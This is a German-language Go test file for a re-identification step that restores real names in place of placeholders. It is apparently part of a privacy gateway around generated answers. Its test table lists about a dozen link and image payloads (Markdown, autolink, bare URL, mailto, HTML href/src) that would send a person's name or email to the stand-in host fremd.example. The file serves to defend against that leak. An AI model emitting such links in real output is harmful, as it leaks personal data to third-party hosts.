package schleuse

// schleuse_reident_link_test.go — Kritiker KS-3 (Sprint-82-Abschluss,
// Runde 2): Die Re-Identifizierung setzte Klarnamen auch in Link- und
// Bildziele ein — ein Klick (oder das Laden eines Bildes) trug sie zu einem
// fremden Host.

import (
	"strings"
	"testing"
)

func TestReIdentifiziere_NichtInLinkziele(t *testing.T) {
	zuordnung := map[string]string{"[PERSON_1]": "Anna Müller", "[EMAIL_1]": "anna@firma.de"}
	faelle := map[string]string{
		"Markdown-Link":          "Siehe [hier](https://fremd.example/?d=[PERSON_1]).",
		"Markdown-Link Leerraum": "Siehe [hier](https://fremd.example/?d= [PERSON_1]).",
		"Markdown-Bild":          "![](https://fremd.example/x.png?n=[PERSON_1])",
		"Link ohne Schema":       "[a](//fremd.example/[EMAIL_1])",
		"Autolink":               "<https://fremd.example/[PERSON_1]>",
		"nackte URL":             "Formular: https://fremd.example/f?name=[PERSON_1]&x=1",
		"www":                    "www.fremd.example/[PERSON_1]",
		"mailto":                 "mailto:[EMAIL_1]",
		"HTML href":              `<a href="https://fremd.example/?d=[PERSON_1]">x</a>`,
		"HTML src ohne Quote":    `<img src=https://fremd.example/[PERSON_1].png>`,
		"HTML SRC Großschrift":   `<IMG SRC = 'https://fremd.example/[PERSON_1]'>`,
	}
	for name, antwort := range faelle {
		erg := ReIdentifiziere(antwort, zuordnung)
		if strings.Contains(erg.Text, "Anna") || strings.Contains(erg.Text, "anna@") {
			t.Errorf("%s: Klarname im Linkziel: %q", name, erg.Text)
		}
		if erg.Text != antwort {
			t.Errorf("%s: Text verändert: %q", name, erg.Text)
		}
		if erg.ImLink != 1 || erg.Ersetzt != 0 || len(erg.Veraendert) != 1 || !strings.HasPrefix(erg.Veraendert[0], "🔗 [") {
			t.Errorf("%s: Meldung fehlt: ImLink=%d Ersetzt=%d Veraendert=%v", name, erg.ImLink, erg.Ersetzt, erg.Veraendert)
		}
	}
}

// Außerhalb eines Ziels wird weiter zurückgeführt — auch als Linktext und
// direkt vor einer Klammer.
func TestReIdentifiziere_LinktextUndKlammerWeiterZurueck(t *testing.T) {
	zuordnung := map[string]string{"[PERSON_1]": "Anna Müller", "[FIRMA_1]": "Firma GmbH"}
	antwort := "[[PERSON_1]](https://doku.example/a) schreibt an [FIRMA_1]. [PERSON_1](Vertrieb) und [PERSON_1]: erledigt."
	erg := ReIdentifiziere(antwort, zuordnung)
	want := "[Anna Müller](https://doku.example/a) schreibt an Firma GmbH. Anna Müller(Vertrieb) und Anna Müller: erledigt."
	if erg.Text != want || erg.Ersetzt != 4 || erg.ImLink != 0 || len(erg.Veraendert) != 0 {
		t.Errorf("%q\n%+v", erg.Text, erg)
	}
}
